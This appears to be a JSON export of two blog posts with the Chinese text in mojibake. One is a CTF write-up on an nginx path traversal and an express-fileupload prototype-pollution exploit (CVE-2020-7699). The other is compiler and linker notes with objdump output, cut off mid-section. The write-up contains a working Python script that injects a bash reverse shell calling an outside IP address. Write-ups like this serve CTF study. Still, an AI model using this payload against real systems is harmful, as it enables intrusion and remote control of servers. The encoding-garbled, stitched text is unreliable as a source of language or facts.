EZnodeåº”è¯¥æ˜¯å›½èµ›åˆ†åŒºèµ›çš„é¢˜ è€ƒç‚¹nginxåå‘ä»£ç†é…ç½®é”™è¯¯ é¦–å…ˆæ¥å­¦ä¹ ä¸€ä¸‹ngnix ngnixngnixæ˜¯ä¸€æ¬¾è‡ªç”±çš„ã€å¼€æºçš„ã€é«˜æ€§èƒ½çš„HTTPæœåŠ¡å™¨å’Œåå‘ä»£ç†æœåŠ¡å™¨ã€‚ ä¸»è¦åœ¨ä¸‰ä¸ªæ–¹é¢ åå‘ä»£ç† è´Ÿè½½å‡è¡¡ nginxç‰¹ç‚¹ åå‘ä»£ç† å…ˆè¯´æ­£å‘ä»£ç† å®¢æˆ·ç«¯éå¸¸æ˜ç¡®è¦è®¿é—®çš„æœåŠ¡å™¨åœ°å€ï¼›æœåŠ¡å™¨åªæ¸…æ¥šè¯·æ±‚æ¥è‡ªå“ªä¸ªä»£ç†æœåŠ¡å™¨ï¼Œè€Œä¸æ¸…æ¥šæ¥è‡ªå“ªä¸ªå…·ä½“çš„å®¢æˆ·ç«¯ï¼›æ­£å‘ä»£ç†æ¨¡å¼å±è”½æˆ–è€…éšè—äº†çœŸå®å®¢æˆ·ç«¯ä¿¡æ¯ã€‚ ä¸Šé¢è¿™ä¸ªå›¾å°±å¾ˆå½¢è±¡äº† å¤šä¸ªå®¢æˆ·ç«¯ç»™æœåŠ¡å™¨å‘é€çš„è¯·æ±‚ï¼ŒnginxæœåŠ¡å™¨æ¥æ”¶åˆ°ä¹‹åï¼Œ æŒ‰ç…§ä¸€å®šçš„è§„åˆ™åˆ†å‘ç»™äº†åç«¯çš„ä¸šåŠ¡å¤„ç†æœåŠ¡å™¨è¿›è¡Œå¤„ç†äº†ã€‚ æ­¤æ—¶~è¯·æ±‚çš„æ¥æºä¹Ÿå°±æ˜¯å®¢æˆ·ç«¯æ˜¯æ˜ç¡®çš„ï¼Œä½†æ˜¯è¯·æ±‚å…·ä½“ç”±å“ªå°æœåŠ¡å™¨å¤„ç†çš„å¹¶ä¸æ˜ç¡®äº†ï¼Œnginxæ‰®æ¼”çš„å°±æ˜¯ä¸€ä¸ªåå‘ä»£ç†è§’è‰² è´Ÿè½½å‡è¡¡ åœ¨åå‘ä»£ç†ä¸­ å®¢æˆ·ç«¯ä¼šå‘æœåŠ¡ç«¯å‘å‡ºè¯·æ±‚ï¼Œè€ŒæœåŠ¡å™¨å°†æ¥å—åˆ°çš„è¯·æ±‚æŒ‰ç…§è§„åˆ™åˆ†å‘çš„è¿‡ç¨‹ï¼Œå°±å«åšè´Ÿè½½å‡è¡¡ ngnixé…ç½® 123456789101112131415161718192021222324252627282930313233343536main # å…¨å±€é…ç½® events &#123; # nginxå·¥ä½œæ¨¡å¼é…ç½® &#125; http &#123; # httpè®¾ç½® .... server &#123; # æœåŠ¡å™¨ä¸»æœºé…ç½® .... location &#123; # è·¯ç”±é…ç½® .... &#125; location path &#123; .... &#125; location otherpath &#123; .... &#125; &#125; server &#123; .... location &#123; .... &#125; &#125; upstream name &#123; # è´Ÿè½½å‡è¡¡é…ç½® .... &#125;&#125; å‘ç°æœ‰ç›®å½•ç©¿è¶Šæ¼æ´å‚è€ƒ https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html /static../ ä¹‹åå°±æ˜¯æ‰¾cveäº†ï¼Œæ¯”è¾ƒèœï¼Œåªèƒ½å­¦ä¹  cve-2020-7699 12345678910import requestscmd = 'bash -c \"bash -i &amp;&gt; /dev/tcp/39.97.105.125/8080 0&gt;&amp;1\"'# polluter1 = requests.post('http://219.219.61.234:20006/y0u_CaNn07_Gu3ss_tHe_pATh', files = &#123;'__proto__.outputFunctionName': ( None, \"x;process.mainModule.require('child_process').exec('&#123;&#125;');x\".format(cmd))&#125;)print(r1.text)# execute commandr2 = requests.get('http://219.219.61.234:20006/')print(r2.text) ä¹‹ååå¼¹shellï¼Œæ‰§è¡Œå‘½ä»¤ã€‚","categories":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/categories/CTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://pz1o.top/tags/CTF/"},{"name":"wp","slug":"wp","permalink":"https://pz1o.top/tags/wp/"}]},{"title":"ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»","slug":"ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»","date":"2021-02-14T08:54:16.000Z","updated":"2021-02-14T08:56:57.211Z","comments":true,"path":"2021/02/14/ç¨‹åºå‘˜çš„è‡ªæˆ‘ä¿®å…»/","link":"","permalink":"https://pz1o.top/2021/02/14/%E7%A8%8B%E5%BA%8F%E5%91%98%E7%9A%84%E8%87%AA%E6%88%91%E4%BF%AE%E5%85%BB/","excerpt":"","text":"0x01 ç¼–è¯‘å’Œé“¾æ¥1.è¢«éšè—äº†çš„è¿‡ç¨‹1gcc a.c æœ‰å››ä¸ªè¿‡ç¨‹ é¢„å¤„ç†â€”&gt;ç¼–è¯‘â€”&gt;æ±‡ç¼–â€”&gt;é“¾æ¥ 1.1 é¢„ç¼–è¯‘é¢„ç¼–è¯‘ä¸»è¦æ¥å¤„ç†é‚£äº›æºä»£ç æ–‡ä»¶ä¸­çš„ä»¥â€#â€å¼€å¤´çš„é¢„ç¼–è¯‘æŒ‡ä»¤ 12gcc -E a.c -o a.icpp a.c &gt; a.i 1.2 ç¼–è¯‘ç¼–è¯‘å°±æ˜¯æŠŠé¢„å¤„ç†å®Œçš„æ–‡ä»¶è½¬åŒ–æˆç›¸åº”çš„æ±‡ç¼–ä»£ç æ–‡ä»¶ 1gcc -S a.i -o a.s cç¼–è¯‘å™¨ä½¿ç”¨cc1 c++æ˜¯cc1plus 1.3 æ±‡ç¼–æ±‡ç¼–å™¨æ˜¯å°†æ±‡ç¼–ä»£ç è½¬å˜æˆæœºå™¨å¯æ‰§è¡Œçš„æŒ‡ä»¤ ç®€å•æ¥è¯´å°±æ˜¯ç¿»è¯‘ï¼Œå°†æ±‡ç¼–ä»£ç ä¸æœºå™¨æŒ‡ä»¤ä¸€ä¸€å¯¹ç…§ç¿»è¯‘ 12as a.s -o a.ogcc -c a.s -o a.o æ±‡ç¼–å™¨æ˜¯as ä»æºæ–‡ä»¶å¼€å§‹ï¼Œé¢„ç¼–è¯‘ï¼Œç¼–è¯‘ï¼Œæ±‡ç¼–è¾“å‡ºçš„æ–‡ä»¶å«åšç›®æ ‡æ–‡ä»¶ã€‚ 1.4 é“¾æ¥é“¾æ¥å¯ä»¥è¯´æ˜¯æœ€éš¾ä»¥ç†è§£çš„ä¸€ä¸ªè¿‡ç¨‹ æ¥ä¸‹æ¥ä¼šè¯´ 2.ç¼–è¯‘å™¨åœ¨åšä»€ä¹ˆä¹Ÿå°±æ˜¯ä¸Šé¢æˆ‘ä»¬è¯´çš„ç¬¬äºŒæ­¥ å®ƒé€šå¸¸æœ‰6ä¸ªè¿‡ç¨‹ æ‰«æ è¯­æ³•åˆ†æ è¯­ä¹‰åˆ†æ æºä»£ç ä¼˜åŒ– ä»£ç ç”Ÿæˆ ç›®æ ‡ä»£ç ä¼˜åŒ– 2.1 è¯æ³•åˆ†æé¦–å…ˆæºä»£ç ä¼šè¢«è¾“å…¥åˆ°æ‰«æå™¨ä¸­ï¼Œæ‰«æå™¨ç®€å•åœ°è¿›è¡Œè¯æ³•åˆ†æï¼Œè¿ç”¨ä¸€ç§ç±»ä¼¼äºæœ‰é™çŠ¶æ€æœºåœ°ç®—æ³•å°†æºä»£ç åœ°å­—ç¬¦åºåˆ—åˆ†å‰²æˆä¸€ç³»åˆ—åœ°è®°å·ã€‚ è®°å·ä¸€èˆ¬ä¸ºï¼šå…³é”®å­—ã€è¯†åˆ«ç¬¦ã€å­—é¢é‡ï¼ˆæ•°å­—å’Œå­—ç¬¦ä¸²ç­‰ï¼‰å’Œç‰¹æ®Šç¬¦å·ï¼ˆåŠ å·å’Œç­‰å·ï¼‰ã€‚ 2.2 è¯­æ³•åˆ†æè¯­æ³•åˆ†æå™¨å°†å¯¹ç”±æ‰«æå™¨äº§ç”Ÿçš„è®°å·è¿›è¡Œè¯­æ³•åˆ†æï¼Œä»è€Œäº§ç”Ÿè¯­æ³•æ ‘ ç®€å•æ¥è¯´ï¼Œè¯­æ³•åˆ†æå™¨äº§ç”Ÿçš„è¯­æ³•æ ‘å°±æ˜¯ä»¥è¡¨è¾¾å¼ä¸ºèŠ‚ç‚¹çš„æ ‘ å…·ä½“å›¾å¯ä»¥çœ‹ä¹¦ 2.3 è¯­ä¹‰åˆ†æè¯­ä¹‰åˆ†æå™¨è¿›è¡Œè¯­ä¹‰åˆ†æ ç¼–è¯‘å™¨æ‰€èƒ½åˆ†æçš„åªæ˜¯é™æ€è¯­ä¹‰ï¼Œä¸ä¹‹æ‰€å¯¹åº”çš„åŠ¨æ€è¯­ä¹‰ï¼Œåªæœ‰åœ¨è¿è¡Œè¿‡ç¨‹ä¸­æ‰å¯ä»¥ç¡®å®š é™æ€è¯­ä¹‰é€šå¸¸åŒ…æ‹¬å£°æ˜å’Œç±»å‹çš„åŒ¹é…ï¼Œç±»å‹è½¬æ¢ã€‚ ä¾‹å¦‚å°†æµ®ç‚¹æ•°èµ‹å€¼ç»™æŒ‡é’ˆå¾ˆæ˜æ˜¾å°±æ˜¯ç±»å‹ä¸åŒ¹é…çš„ã€‚ ç»è¿‡è¯­ä¹‰åˆ†æä¹‹åï¼Œè¯­æ³•æ ‘ä¸Šçš„è¡¨è¾¾å¼ä¼šè¢«æ ‡è¯†ç±»å‹ã€‚ 2.4 ä¸­é—´è¯­è¨€ç”Ÿæˆæºç çº§ä¼˜åŒ–å™¨åœ¨ä¸åŒç¼–è¯‘å™¨ä¸­ä¼šæœ‰æ‰€å·®åˆ«ã€‚ ä½†ä½œç”¨æ˜¯ä¸€æ ·çš„ï¼Œéƒ½æ˜¯å°†æ•´ä¸ªè¯­æ³•æ ‘è½¬æ¢æˆä¸­é—´ä»£ç ã€‚ ä¸­é—´ä»£ç Â·ä½¿å¾—ç¼–è¯‘å™¨ç”Ÿæˆå‰ç«¯å’Œåç«¯ã€‚å‰ç«¯è´Ÿè´£äº§ç”Ÿæœºå™¨æ— å…³çš„ä¸­é—´ä»£ç ï¼Œç¼–è¯‘å™¨åç«¯å°†ä¸­é—´ä»£ç è½¬æ¢æˆç›®æ ‡æœºå™¨ä»£ç ã€‚ 2.5 ç›®æ ‡ä»£ç ç”Ÿæˆä¸ä¼˜åŒ–ç¼–è¯‘å™¨åç«¯ä¸»è¦åŒ…æ‹¬ä»£ç ç”Ÿæˆå™¨å’Œç›®æ ‡ä»£ç ä¼˜åŒ–å™¨ ä»£ç ç”Ÿæˆå™¨ï¼šå°†ä¸­é—´ä»£ç è½¬æ¢æˆæœºå™¨ä»£ç ï¼Œä¸åŒæœºå™¨çš„ä¸åŒå­—é•¿ã€å¯„å­˜å™¨ã€æ•´æ•°æ•°æ®ç±»å‹ã€æµ®ç‚¹æ•°æ•°æ®ç±»å‹éƒ½ä¼šå½±å“ä»£ç ç”Ÿæˆå™¨ã€‚ æˆ‘ä»¬ç»è¿‡ä»¥ä¸Šæ­¥éª¤ç”Ÿæˆçš„ä»£ç å…¨éƒ½æ˜¯æœªç»é“¾æ¥çš„ç›®æ ‡ä»£ç ï¼Œæœ€ç»ˆéƒ½éœ€è¦é€šè¿‡é“¾æ¥å™¨å°†ç›®æ ‡æ–‡ä»¶é“¾æ¥èµ·æ¥äº§ç”Ÿå¯æ‰§è¡Œæ–‡ä»¶ã€‚ 3.é“¾æ¥å™¨é‡å®šä½ï¼šé‡æ–°è®¡ç®—å„ä¸ªç›®æ ‡åœ°å€è¿‡ç¨‹ ç¬¦å·ï¼šç”¨æ¥è¡¨ç¤ºä¸€ä¸ªåœ°å€ï¼Œå¯èƒ½æ˜¯ä¸€æ®µå­ç¨‹åºçš„èµ·å§‹åœ°å€ï¼Œæˆ–ä¸€ä¸ªå˜é‡çš„èµ·å§‹åœ°å€ 4.é™æ€é“¾æ¥æ¯ä¸ªæºç ç‹¬ç«‹åœ°ç¼–è¯‘ï¼Œç„¶åæŒ‰ç…§éœ€è¦å°†ä»–ä»¬ç»„è£…èµ·æ¥ï¼Œç»„è£…æ¨¡å—çš„è¿‡ç¨‹å«åšé“¾æ¥ã€‚ é“¾æ¥è¿‡ç¨‹åŒ…æ‹¬åœ°å€ç©ºé—´åˆ†é…ï¼ˆAddress and Storage Allocationï¼‰ã€ç¬¦å·å†³è®®ï¼ˆSymbol Resolutionï¼‰å’Œé‡å®šä½ï¼ˆRelocationï¼‰ ç¬¦å·å†³è®®å’Œç¬¦å·ç»‘å®šå¤§ä½“æ˜¯å·®ä¸å¤šçš„ï¼Œä½†å†³è®®ç”¨äºé™æ€é“¾æ¥ï¼Œç»‘å®šç”¨äºåŠ¨æ€é“¾æ¥ å¦‚å›¾æ‰€ç¤ºï¼Œæºä»£ç æ–‡ä»¶ç¼–è¯‘æˆç›®æ ‡æ–‡ä»¶ï¼Œç›®æ ‡æ–‡ä»¶å’Œåº“ä¸€èµ·é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶ã€‚ ä¸¾ä¸ªä¾‹å­ åœ¨main.cä¸­éœ€è¦å…¶ä»–æ¨¡å—fun.cä¸­çš„foo() æ‰€ä»¥æˆ‘ä»¬åœ¨main.cä¸­æ¯ä¸€å¤„è°ƒç”¨fooçš„æ—¶å€™éƒ½å¿…é¡»çŸ¥é“fooè¿™ä¸ªå‡½æ•°çš„åœ°å€ï¼Œä½†ç”±äºæ˜¯å•ç‹¬ç¼–è¯‘çš„ æˆ‘ä»¬å¹¶ä¸çŸ¥é“è¿™ä¸ªåœ°å€ï¼Œè‹¥æ— é“¾æ¥å™¨ï¼Œæˆ‘ä»¬éœ€è¦æ‰‹åŠ¨ä¿®æ­£åœ°å€ é€šè¿‡é“¾æ¥å™¨æˆ‘ä»¬å¯ä»¥ç›´æ¥å¼•ç”¨fooè€Œæ— éœ€çŸ¥é“å®ƒçš„åœ°å€ï¼Œå› ä¸ºé“¾æ¥å™¨åœ¨é“¾æ¥çš„æ—¶å€™ï¼Œä¼šæ ¹æ®æ‰€å¼•ç”¨çš„ç¬¦å·fooï¼Œè‡ªåŠ¨å»ç›¸åº”çš„æ¨¡å—æŸ¥æ‰¾fooçš„åœ°å€ï¼Œå¹¶å°†mainä¸­fooçš„åœ°å€é‡æ–°ä¿®æ­£ 0x02 ç›®æ ‡æ–‡ä»¶æˆ‘ä»¬ä¸Šé¢å·²ç»çŸ¥é“æºä»£ç ç»è¿‡é¢„å¤„ç†ï¼Œç¼–è¯‘ï¼Œæ±‡ç¼–äº§ç”Ÿçš„æ–‡ä»¶å°±å«ç›®æ ‡æ–‡ä»¶ã€‚ ç›®æ ‡æ–‡ä»¶å…¶å®æ˜¯å·²ç»ç¼–è¯‘åçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œåªæ˜¯æœ‰äº›ç¬¦å·å’Œåœ°å€æœªè¢«è°ƒæ•´ï¼Œæœ¬èº«å°±æ˜¯æŒ‰ç…§å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼å­˜å‚¨çš„ï¼Œä½†å’ŒçœŸæ­£å¯æ‰§è¡Œæ–‡ä»¶è¿˜æœ‰æ‰€ä¸åŒã€‚ å¯ä»¥å…ˆæ¥çœ‹ä¸€ä¸‹ ä¸‹é¢æˆ‘ä»¬å°†è®²è¿™ä¸ªæ–‡ä»¶åˆ°åº•æ˜¯ä»€ä¹ˆ 1.ç›®æ ‡æ–‡ä»¶çš„æ ¼å¼æˆ‘ä»¬ç†ŸçŸ¥çš„windowsä¸‹çš„PEï¼ˆPortable Executableï¼‰å’ŒLinuxçš„ELFï¼ˆExecutable Linkable Formatï¼‰çš„æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ ç›®æ ‡æ–‡ä»¶å°±æ˜¯æºä»£ç ç¼–è¯‘åä½†æœªè¿›è¡Œé“¾æ¥çš„ä¸­é—´æ–‡ä»¶ã€‚å®ƒä¸å¯æ‰§è¡Œæ–‡ä»¶çš„å†…å®¹å’Œç»“æ„å¾ˆç›¸ä¼¼ï¼Œæ‰€ä»¥ä¸€èˆ¬è·Ÿå¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼ä¸€èµ·ç”¨ä¸€ç§æ ¼å¼å­˜å‚¨ã€‚ æ­¤å¤–ï¼Œè¿˜æœ‰å…¶ä»–å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼OMFï¼ˆObject Module Formatï¼‰å’ŒUnix a.outæ ¼å¼å’ŒMS-DOS.COMæ ¼å¼ç­‰ã€‚ åŠ¨æ€é“¾æ¥åº“ï¼ˆDynamic Linking Libraryï¼‰ï¼ˆwindowsä¸‹çš„dllå’Œlinuxä¸­çš„soï¼‰åŠé™æ€é“¾æ¥åº“ï¼ˆStatic Linking Libaryï¼‰ï¼ˆwindowsä¸‹çš„libå’ŒLinuxä¸­çš„aï¼‰éƒ½æŒ‰ç…§å¯æ‰§è¡Œæ–‡ä»¶æ ¼å¼å­˜å‚¨ é™æ€é“¾æ¥åº“æ˜¯ä¸€ä¸ªåŒ…å«æœ‰å¾ˆå¤šç›®æ ‡æ–‡ä»¶çš„æ–‡ä»¶åŒ… æ–‡ä»¶æ ¼å¼å¦‚ä¸‹ ELFæ–‡ä»¶ç±»å‹ è¯´æ˜ å®ä¾‹ é‡å®šä½æ–‡ä»¶(Relocatable File) åŒ…å«ä»£ç å’Œæ•°æ®ï¼Œå¯ä»¥è¢«é“¾æ¥æˆå¯æ‰§è¡Œæ–‡ä»¶æˆ–ç›®æ ‡æ–‡ä»¶ Linuxä¸­.o Winä¸‹çš„obj å¯æ‰§è¡Œæ–‡ä»¶(Executable File) å¯ä»¥æ‰§è¡Œçš„ç¨‹åº,é€šå¸¸æ— æ‰©å±•å Linuxä¸­.out Winä¸‹çš„.exe å…±äº«ç›®æ ‡æ–‡ä»¶(Shared Object File) åŒ…å«ä»£ç å’Œæ•°æ®ï¼Œæœ‰ä¸¤ç§æƒ…å†µã€‚ç¬¬ä¸€ç§æ˜¯é“¾æ¥å™¨å¯ä»¥ä½¿ç”¨è¿™ç§æ–‡ä»¶è·Ÿå…¶ä»–çš„é‡å®šä½æ–‡ä»¶å’Œå…±äº«ç›®æ ‡æ–‡ä»¶è¿›è¡Œé“¾æ¥äº§ç”Ÿæ–°çš„ç›®æ ‡æ–‡ä»¶ã€‚ç¬¬äºŒç§äº‹åŠ¨æ€é“¾æ¥å™¨å¯ä»¥å°†å‡ ä¸ªå…±äº«ç›®æ ‡æ–‡ä»¶ä¸å¯æ‰§è¡Œæ–‡ä»¶ç»“åˆï¼Œä½œä¸ºè¿›ç¨‹æ˜ åƒçš„ä¸€éƒ¨åˆ†æ¥è¿è¡Œ Linuxä¸­.soå’ŒWinä¸­DLL æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶(Core Dump File) å½“è¿›ç¨‹æ„å¤–ç»ˆæ­¢æ—¶ï¼Œç³»ç»Ÿå¯ä»¥å°†è¯¥è¿›ç¨‹çš„åœ°å€ç©ºé—´çš„å†…å®¹åŠç»ˆæ­¢æ—¶çš„ä¸€äº›å…¶ä»–ä¿¡æ¯è½¬å‚¨åˆ°æ ¸å¿ƒè½¬å‚¨æ–‡ä»¶ Linuxä¸­çš„Core Dump 2.ç›®æ ‡æ–‡ä»¶æ˜¯ä»€ä¹ˆæ ·çš„ç›®æ ‡æ–‡ä»¶é™¤äº†æœºå™¨æŒ‡ä»¤ä»£ç ã€æ•°æ®ï¼Œè¿˜åŒ…æ‹¬äº†é“¾æ¥æ—¶æ‰€éœ€è¦çš„ä¸€äº›ä¿¡æ¯ï¼Œæ¯”å¦‚ç¬¦å·è¡¨ã€è°ƒè¯•ä¿¡æ¯å’Œç¬¦å·ä¸²ç­‰ã€‚ ç›®æ ‡æ–‡ä»¶é€šå¸¸å°†è¿™äº›ä¿¡æ¯æŒ‰ä¸åŒçš„å±æ€§ï¼Œä»¥èŠ‚ï¼ˆSectionï¼‰æ¥å­˜å‚¨ï¼Œä¹Ÿå«æ®µï¼ˆSegmentï¼‰ æˆ‘ä»¬ç†ŸçŸ¥çš„ä»£ç æ®µã€æ•°æ®æ®µå°±æ˜¯è¿™ä¸ªä¸œè¥¿ ä»£ç æ®µå­˜å‚¨ä»£ç å«.codeæˆ–.text æ•°æ®æ®µå­˜å‚¨å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡å«.data ä»è¿™ä¸ªå›¾ä¸­å¯ä»¥çœ‹åˆ°ï¼ŒELFæ–‡ä»¶çš„å¼€å¤´æ˜¯ä¸€ä¸ªæ–‡ä»¶å¤´ï¼Œå®ƒæè¿°äº†æ•´ä¸ªæ–‡ä»¶çš„æ–‡ä»¶å±æ€§ï¼ŒåŒ…æ‹¬æ–‡ä»¶æ˜¯å¦å¯æ‰§è¡Œã€æ˜¯é™æ€é“¾æ¥è¿˜æ˜¯åŠ¨æ€é“¾æ¥ã€ç›®æ ‡ç¡¬ä»¶ã€ç›®æ ‡æ“ä½œç³»ç»Ÿç­‰å„ç§ä¿¡æ¯ æ­¤å¤–ï¼Œæ–‡ä»¶å¤´è¿˜æœ‰ä¸€ä¸ªæ®µè¡¨ï¼Œ æ®µè¡¨æ˜¯ä¸€ä¸ªæè¿°æ–‡ä»¶ä¸­å„ä¸ªæ®µçš„æ•°ç»„ã€‚æ®µè¡¨æè¿°äº†æ–‡ä»¶ä¸­å„ä¸ªæ®µåœ¨æ–‡ä»¶ä¸­çš„åç§»ä½ç½®ä»¥åŠæ®µçš„å±æ€§ç­‰ï¼Œä»æ®µé‡Œé¢å¯ä»¥å¾—åˆ°æ¯ä¸ªæ®µçš„æ‰€æœ‰ä¿¡æ¯ã€‚ æ–‡ä»¶å¤´ä¹‹åå°±æ˜¯å„ä¸ªæ®µçš„å†…å®¹ .textï¼šå­˜å‚¨cè¯­è¨€ç¼–è¯‘åçš„æ‰§è¡Œè¯­å¥ç¼–è¯‘æˆçš„æœºå™¨ä»£ç  .dataï¼šå­˜å‚¨å·²åˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡ .bssï¼šå­˜å‚¨æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡ é‚£ä¹ˆä¸ºä»€ä¹ˆè¦è®¾ç½®bssæ®µå‘¢ï¼Ÿ åœ¨ç¨‹åºä¸­ï¼Œæœªåˆå§‹åŒ–çš„å˜é‡æ˜¯0ï¼Œå¦‚æœæŠŠä»–ä»¬æ”¾åœ¨dataæ®µå¹¶åˆ†é…ç©ºé—´èµ‹å€¼0æ˜¯å®Œå…¨æµªè´¹ç©ºé—´çš„ä¸€ç§åšæ³•ï¼Œ æ‰€ä»¥å¯æ‰§è¡Œæ–‡ä»¶ä¸ºäº†è®°å½•æ‰€æœ‰æœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡çš„å¤§å°æ€»å’Œï¼Œè®°åšbssæ®µ bssæ®µåªæ˜¯ä¸ºæœªåˆå§‹åŒ–çš„å…¨å±€å˜é‡å’Œå±€éƒ¨é™æ€å˜é‡é¢„ç•™ä½ç½®è€Œå·²ï¼Œå¹¶æ²¡æœ‰å†…å®¹ï¼Œåœ¨æ–‡ä»¶ä¸­ä¹Ÿä¸å ç©ºé—´ æ€»ä½“æ¥è¯´ï¼Œç¨‹åºæºä»£ç è¢«ç¼–è¯‘ä»¥åä¸»è¦åˆ†æˆä¸¤ç§æ®µï¼šç¨‹åºæŒ‡ä»¤å’Œç¨‹åºæ•°æ®ã€‚ä»£ç æ®µå±äºç¨‹åºæŒ‡ä»¤ï¼Œè€Œæ•°æ®æ®µå’Œbssæ®µå±äºç¨‹åºæ•°æ®ã€‚ 3.æŒ–æ˜SimpleSection.oè¿™é‡Œæˆ‘ä»¬æ¢æˆa.o 123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;int global_init_var = 84;int global_uninit_var;void func1(int i)&#123; printf(\"%d\\n\",i);&#125;int main(void)&#123; static int static_var = 85; static int static_var2; int a = 1; int b; func1(static_var + static_var2 + a + b); return 0;&#125; ç¼–è¯‘ä¸€ä¸‹ ç°åœ¨æˆ‘ä»¬æ¥å…·ä½“åˆ†æä¸€ä¸‹ 123$ objdump -h a.o&#x2F;&#x2F;-hå°†åŸºæœ¬ä¿¡æ¯æ‰“å°å‡ºæ¥&#x2F;&#x2F;-xæ‰“å°æ›´å¤šä¿¡æ¯ ä»£ç æ®µï¼Œæ•°æ®æ®µï¼Œbssæ®µæˆ‘ä»¬å·²ç»çŸ¥é“äº† å¯ä»¥çœ‹åˆ°è¿˜æœ‰åªè¯»æ•°æ®æ®µ.rodata æ³¨é‡Šæ®µ.comment å †æ ˆæç¤ºæ®µ.note.GNU-stackæ®µ ä¸‹é¢ç¬¬äºŒè¡ŒCONTENTS ALLOCè¡¨ç¤ºæ®µçš„å„ç§å±æ€§ï¼ŒCONTENTSè¡¨ç¤ºè¯¥æ®µåœ¨æ–‡ä»¶ä¸­å­˜åœ¨ çœ‹åˆ°BSSæ®µæ˜¯æ²¡æœ‰CONTENTSè¡¨ç¤ºå®ƒå®é™…åœ¨ELFæ–‡ä»¶ä¸­ä¸å­˜åœ¨å†…å®¹ ä¸‹é¢æˆ‘ä»¬å°±æ¥çœ‹ä¸€ä¸‹å„ä¸ªæ®µçš„åˆ†å¸ƒ è¿™é‡Œå’Œä¹¦ä¸Šä¸åŒçš„æ˜¯.note.GNU-stackå äº†å†…å®¹ï¼Œé‚£ä¹ˆæˆ‘ä»¬ä¹ŸæŠŠä»–å†™ä¸Š 3.1 ä»£ç æ®µ123$ objdump -s -d a.o&#x2F;&#x2F;-s å°†æ®µå†…å®¹æŒ‰ç…§16è¿›åˆ¶æ‰“å°&#x2F;&#x2F;-d å¯ä»¥å°†æ‰€æœ‰åŒ…å«æŒ‡ä»¤çš„æ®µåæ±‡ç¼– 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768a.oï¼š æ–‡ä»¶æ ¼å¼ elf32-i386Contents of section .text: 0000 5589e583 ec0883ec 08ff7508 68000000 U.........u.h... 0010 00e8fcff ffff83c4 1090c9c3 8d4c2404 .............L$. 0020 83e4f0ff 71fc5589 e55183ec 14c745f0 ....q.U..Q....E. 0030 01000000 8b150400 0000a100 00000001 ................ 0040 c28b45f0 01c28b45 f401d083 ec0c50e8 ..E....E......P. 0050 fcffffff 83c410b8 00000000 8b4dfcc9 .............M.. 0060 8d61fcc3 .a.. Contents of section .data: 0000 54000000 55000000 T...U... Contents of section .rodata: 0000 25640a00 %d.. Contents of section .comment: 0000 00474343 3a202855 62756e74 7520352e .GCC: (Ubuntu 5. 0010 342e302d 36756275 6e747531 7e31362e 4.0-6ubuntu1~16. 0020 30342e31 32292035 2e342e30 20323031 04.12) 5.4.0 201 0030 36303630 3900 60609. Contents of section .eh_frame: 0000 14000000 00000000 017a5200 017c0801 .........zR..|.. 0010 1b0c0404 88010000 1c000000 1c000000 ................ 0020 00000000 1c000000 00410e08 8502420d .........A....B. 0030 0558c50c 04040000 28000000 3c000000 .X......(...&lt;... 0040 1c000000 48000000 00440c01 00471005 ....H....D...G.. 0050 02750043 0f03757c 06750c01 0041c543 .u.C..u|.u...A.C 0060 0c040400 .... Disassembly of section .text:00000000 &lt;func1&gt;: 0: 55 push %ebp 1: 89 e5 mov %esp,%ebp 3: 83 ec 08 sub $0x8,%esp 6: 83 ec 08 sub $0x8,%esp 9: ff 75 08 pushl 0x8(%ebp) c: 68 00 00 00 00 push $0x0 11: e8 fc ff ff ff call 12 &lt;func1+0x12&gt; 16: 83 c4 10 add $0x10,%esp 19: 90 nop 1a: c9 leave 1b: c3 ret 0000001c &lt;main&gt;: 1c: 8d 4c 24 04 lea 0x4(%esp),%ecx 20: 83 e4 f0 and $0xfffffff0,%esp 23: ff 71 fc pushl -0x4(%ecx) 26: 55 push %ebp 27: 89 e5 mov %esp,%ebp 29: 51 push %ecx 2a: 83 ec 14 sub $0x14,%esp 2d: c7 45 f0 01 00 00 00 movl $0x1,-0x10(%ebp) 34: 8b 15 04 00 00 00 mov 0x4,%edx 3a: a1 00 00 00 00 mov 0x0,%eax 3f: 01 c2 add %eax,%edx 41: 8b 45 f0 mov -0x10(%ebp),%eax 44: 01 c2 add %eax,%edx 46: 8b 45 f4 mov -0xc(%ebp),%eax 49: 01 d0 add %edx,%eax 4b: 83 ec 0c sub $0xc,%esp 4e: 50 push %eax 4f: e8 fc ff ff ff call 50 &lt;main+0x34&gt; 54: 83 c4 10 add $0x10,%esp 57: b8 00 00 00 00 mov $0x0,%eax 5c: 8b 4d fc mov -0x4(%ebp),%ecx 5f: c9 leave 60: 8d 61 fc lea -0x4(%ecx),%esp 63: c3 ret é€šè¿‡ä¸Šé¢è¿™æ®µä»£ç  æˆ‘ä»¬å¯¹æ–‡ä»¶å†…å®¹æœ‰äº†æ›´æ·±å…¥çš„äº†è§£ æœ€å·¦é¢æ˜¯åç§»é‡ï¼Œä¸­é—´æ˜¯16è¿›åˆ¶å†…å®¹ï¼Œå³é¢æ˜¯asciiå½¢å¼ åæ±‡ç¼–ç»“æœæˆ‘ä»¬ä¹Ÿå¾ˆç†Ÿæ‚‰ 3.2 